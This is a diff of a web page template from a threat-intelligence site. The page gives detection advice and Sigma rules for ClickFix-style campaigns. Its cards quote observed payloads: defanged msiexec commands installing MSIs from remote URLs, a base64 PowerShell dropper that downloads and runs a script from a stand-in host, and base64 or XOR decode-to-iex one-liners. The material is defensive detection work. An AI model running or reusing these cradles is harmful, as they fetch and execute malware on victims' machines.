-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="payload-ex-selfdelete">
-        <span class="collapsible-chevron">›</span>
-        Example payloads ({{ site.data.clickgrab_trends.payload_examples.self_delete | size }})
-      </button>
-      <div id="payload-ex-selfdelete" class="collapsible-body collapsed">
-        {% for ex in site.data.clickgrab_trends.payload_examples.self_delete %}
-        <pre class="cg-payload-example"><code>{{ ex.text }}</code></pre>
-        <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
-        {% endfor %}
-      </div>
-    </div>
-    {% endif %}
-  </div>
+  </details>
 </div>
 
-<div class="cg-rec">
-  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-blind" style="display:block;text-align:center;padding:.25rem .5rem;">INFRA</span></div>
-  <div class="cg-rec-body">
-    <strong>CDN staging: pivot from domain blocking to path-pattern detection</strong>
-    <code>irp.cdn-website.com</code> is a legitimate CDN. Block it and you break legitimate sites. Instead, alert on PowerShell fetching from <code>*.cdn-website.com</code> paths matching <code>/files/uploaded/*.ps1</code>. Or use JA4/TLS fingerprinting on the outbound connection rather than the destination hostname.
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="logic-ex-cdn">
-        <span class="collapsible-chevron">›</span>
-        Example detection logic
-      </button>
-      <div id="logic-ex-cdn" class="collapsible-body collapsed">
+<div class="det-rec">
+  <div class="det-rec-header">
+    <span class="det-rec-tier tier-na">INFRA</span>
+    <div>
+      <div class="det-rec-title">CDN staging: pivot from domain blocking to path-pattern detection</div>
+      <div class="det-rec-desc"><code>irp.cdn-website.com</code> is a legitimate CDN. Block it and you break legitimate sites. Instead, alert on PowerShell fetching from <code>*.cdn-website.com</code> paths matching <code>/files/uploaded/*.ps1</code>. Or use JA4/TLS fingerprinting on the outbound connection rather than the destination hostname.</div>
+    </div>
+  </div>
+  {% if site.data.clickgrab_trends.payload_examples.cdn_staging.size > 0 %}
+  <details>
+    <summary>Observed staging URLs ({{ site.data.clickgrab_trends.payload_examples.cdn_staging | size }})</summary>
+    {% for ex in site.data.clickgrab_trends.payload_examples.cdn_staging %}
+    <pre class="cg-payload-example"><code>{{ ex.url }}</code></pre>
+    <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
+    {% endfor %}
+  </details>
+  {% endif %}
+  <details>
+    <summary>Example detection logic</summary>
 <pre class="cg-payload-example"><code>title: PowerShell Fetching Script From CDN Uploads Path
 # Path-based detection: keep the CDN reachable for legitimate use, catch the staging pattern.
 logsource:
@@ -714,53 +733,28 @@ detection:
       - '.hta'
   condition: selection_client and selection_host and selection_path
 level: high</code></pre>
-      </div>
-    </div>
-    {% if site.data.clickgrab_trends.payload_examples.cdn_staging.size > 0 %}
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="payload-ex-cdn">
-        <span class="collapsible-chevron">›</span>
-        Example staging URLs ({{ site.data.clickgrab_trends.payload_examples.cdn_staging | size }})
-      </button>
-      <div id="payload-ex-cdn" class="collapsible-body collapsed">
-        {% for ex in site.data.clickgrab_trends.payload_examples.cdn_staging %}
-        <pre class="cg-payload-example"><code>{{ ex.url }}</code></pre>
-        <div class="cg-payload-meta">Observed: {{ ex.date }}</div>
-        {% endfor %}
-      </div>
-    </div>
-    {% endif %}
-  </div>
+  </details>
 </div>
 
-<div class="cg-rec">
-  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t1" style="display:block;text-align:center;padding:.25rem .5rem;">T1218</span></div>
-  <div class="cg-rec-body">
-    <strong>Detect MSIExec fetching packages from non-enterprise URLs</strong>
-    <code>msiexec.exe</code> with <code>/i http</code> where the URL is not a known enterprise software source, spawned from <code>cmd.exe</code> or <code>explorer.exe</code> (Run dialog). Covers the 1,027-domain MSIExec delivery campaign that peaked at 87% in Nov 2025.
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="payload-ex-msiexec">
-        <span class="collapsible-chevron">›</span>
-        Example payloads (3)
-      </button>
-      <div id="payload-ex-msiexec" class="collapsible-body collapsed">
-        <pre class="cg-payload-example"><code>msiexec /i hxxps[://]shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/</code></pre>
-        <div class="cg-payload-meta">Peak-campaign pattern. Long "verification" path, random CustomerID, cloudflare-themed lure.</div>
-        <pre class="cg-payload-example"><code>msiexec /i hxxps[://]verifyhumanbot[.]com/pkg/update.msi /quiet /norestart</code></pre>
-        <div class="cg-payload-meta">Silent install with <code>/quiet /norestart</code>. No prompts, no dialogs.</div>
-        <pre class="cg-payload-example"><code>msiexec /i hxxp[://]198[.]13[.]158[.]127:5506/i.msi</code></pre>
-        <div class="cg-payload-meta">Port-5506 direct-IP staging. Bypasses domain reputation. Raw IP + nonstandard port is the signal.</div>
-      </div>
+<div class="det-rec">
+  <div class="det-rec-header">
+    <span class="det-rec-tier tier-2">T1218</span>
+    <div>
+      <div class="det-rec-title">Detect MSIExec fetching packages from non-enterprise URLs</div>
+      <div class="det-rec-desc"><code>msiexec.exe</code> with <code>/i http</code> where the URL is not a known enterprise software source, spawned from <code>cmd.exe</code> or <code>explorer.exe</code> (Run dialog). Covers the 1,027-domain MSIExec delivery campaign that peaked at 87% in Nov 2025.</div>
     </div>
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="logic-ex-msiexec">
-        <span class="collapsible-chevron">›</span>
-        Example detection logic
-      </button>
-      <div id="logic-ex-msiexec" class="collapsible-body collapsed">
+  </div>
+  <details>
+    <summary>Observed payloads (3)</summary>
+    <pre class="cg-payload-example"><code>msiexec /i hxxps[://]shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/</code></pre>
+    <div class="cg-payload-meta">Peak-campaign pattern. Long "verification" path, random CustomerID, cloudflare-themed lure.</div>
+    <pre class="cg-payload-example"><code>msiexec /i hxxps[://]verifyhumanbot[.]com/pkg/update.msi /quiet /norestart</code></pre>
+    <div class="cg-payload-meta">Silent install with <code>/quiet /norestart</code>. No prompts, no dialogs.</div>
+    <pre class="cg-payload-example"><code>msiexec /i hxxp[://]198[.]13[.]158[.]127:5506/i.msi</code></pre>
+    <div class="cg-payload-meta">Port-5506 direct-IP staging. Bypasses domain reputation. Raw IP + nonstandard port is the signal.</div>
+  </details>
+  <details>
+    <summary>Example detection logic</summary>
 <pre class="cg-payload-example"><code>title: MSIExec Installing Package From Remote URL via Run Dialog
 logsource:
   category: process_creation
@@ -784,38 +778,28 @@ detection:
       - 'office.com'
   condition: selection_proc and selection_remote and selection_parent and not filter_enterprise
 level: high</code></pre>
-      </div>
-    </div>
-  </div>
+  </details>
 </div>
 
-<div class="cg-rec">
-  <div class="cg-rec-tier"><span class="cg-tier-badge cg-tier-t1" style="display:block;text-align:center;padding:.25rem .5rem;">T1059</span></div>
-  <div class="cg-rec-body">
-    <strong>Detect inline payload decode-and-execute</strong>
-    PowerShell with <code>-enc</code> flag or XOR decode operations (<code>-bxor</code>, <code>[byte]</code>, <code>[char]</code>) spawned from unusual parent (Run dialog chain). Also: <code>[Convert]::FromBase64String</code> followed by <code>iex</code>. Covers the 28% → 75% growth in inline payloads that skip the network fetch entirely. <strong>Run alongside network-fetch detection. Both are needed for full coverage.</strong>
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="payload-ex-inline">
-        <span class="collapsible-chevron">›</span>
-        Example payloads (3)
-      </button>
-      <div id="payload-ex-inline" class="collapsible-body collapsed">
-        <pre class="cg-payload-example"><code>powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBiAGEAZAAuAGUAeABhAG0AcABsAGUALwBwAC4AcABzADEAIgApAA==</code></pre>
-        <div class="cg-payload-meta">Classic <code>-EncodedCommand</code> dropper. Base64 decodes to an IEX + DownloadString cradle. The encoding is the signal, not the content.</div>
-        <pre class="cg-payload-example"><code>powershell -c "$b=[Convert]::FromBase64String('...'); iex ([System.Text.Encoding]::UTF8.GetString($b))"</code></pre>
-        <div class="cg-payload-meta"><code>FromBase64String</code> piped to <code>iex</code> inline. No network fetch. Entire payload ships in the clipboard paste.</div>
-        <pre class="cg-payload-example"><code>powershell -c "$k=0x13; $e=@(0x42,0x17,0x26,...); -join($e|%{[char]($_ -bxor $k)})|iex"</code></pre>
-        <div class="cg-payload-meta">XOR-decode loop. Single-byte key, byte array, <code>-bxor</code> reduction, piped to <code>iex</code>. Pure in-memory decode.</div>
-      </div>
+<div class="det-rec">
+  <div class="det-rec-header">
+    <span class="det-rec-tier tier-1">T1059</span>
+    <div>
+      <div class="det-rec-title">Detect inline payload decode-and-execute</div>
+      <div class="det-rec-desc">PowerShell with <code>-enc</code> flag or XOR decode operations (<code>-bxor</code>, <code>[byte]</code>, <code>[char]</code>) spawned from unusual parent (Run dialog chain). Also: <code>[Convert]::FromBase64String</code> followed by <code>iex</code>. Covers the 28% → 75% growth in inline payloads that skip the network fetch entirely. <strong>Run alongside network-fetch detection. Both are needed for full coverage.</strong></div>
     </div>
-    <div class="cg-rec-examples">
-      <button class="cg-rec-examples-toggle collapsible-header" aria-expanded="false"
-              data-target="logic-ex-inline">
-        <span class="collapsible-chevron">›</span>
-        Example detection logic
-      </button>
-      <div id="logic-ex-inline" class="collapsible-body collapsed">
+  </div>
+  <details>
+    <summary>Observed payloads (3)</summary>
+    <pre class="cg-payload-example"><code>powershell -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBiAGEAZAAuAGUAeABhAG0AcABsAGUALwBwAC4AcABzADEAIgApAA==</code></pre>
+    <div class="cg-payload-meta">Classic <code>-EncodedCommand</code> dropper. Base64 decodes to an IEX + DownloadString cradle. The encoding is the signal, not the content.</div>
+    <pre class="cg-payload-example"><code>powershell -c "$b=[Convert]::FromBase64String('...'); iex ([System.Text.Encoding]::UTF8.GetString($b))"</code></pre>
+    <div class="cg-payload-meta"><code>FromBase64String</code> piped to <code>iex</code> inline. No network fetch. Entire payload ships in the clipboard paste.</div>
+    <pre class="cg-payload-example"><code>powershell -c "$k=0x13; $e=@(0x42,0x17,0x26,...); -join($e|%{[char]($_ -bxor $k)})|iex"</code></pre>
+    <div class="cg-payload-meta">XOR-decode loop. Single-byte key, byte array, <code>-bxor</code> reduction, piped to <code>iex</code>. Pure in-memory decode.</div>
+  </details>
+  <details>
+    <summary>Example detection logic</summary>
 <pre class="cg-payload-example"><code>title: PowerShell Inline Decode-and-Execute (No Network Fetch)
 logsource:
   category: process_creation
@@ -848,15 +832,16 @@ detection:
   condition: selection_proc and selection_parent and (selection_encoded or selection_xor or selection_b64_iex)
 level: high
 # Run alongside the cradle-agnostic network fetch rule. Both are needed.</code></pre>
-      </div>
-    </div>
-  </div>
+  </details>
 </div>
 
 </div><!-- /.cg-page / .trends-content -->
 </div><!-- /.trends-layout -->
 
 <!-- ── Data injection + chart init ──────────────────────────────────── -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/styles/atom-one-dark.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/languages/powershell.min.js"></script>
 <script>
 window.CLICKGRAB_TRENDS = {{ site.data.clickgrab_trends | jsonify }};
 </script>
@@ -905,5 +890,22 @@ document.querySelectorAll('.cg-infra-toggle').forEach(function(btn) {
     });
   }, { rootMargin: '-20% 0px -70% 0px' });
   sections.forEach(function(section) { observer.observe(section); });
+})();
+
+// Syntax highlighting
+(function() {
+  if (typeof hljs === 'undefined') return;
+  function detectLang(text) {
+    if (/logsource:|condition:/.test(text)) return 'yaml';
+    if (/\$[A-Za-z_]|\bIEX\b|\bInvoke-[A-Z]|\bFromBase64String\b/i.test(text)) return 'powershell';
+    return 'bash';
+  }
+  document.querySelectorAll('pre.cg-payload-example code, pre.logic-block code').forEach(function(el) {
+    var text = el.textContent || el.innerText;
+    var lang = detectLang(text);
+    el.textContent = text; // strip any existing HTML
+    el.className = 'language-' + lang;
+    hljs.highlightElement(el);
+  });
 })();
 </script>
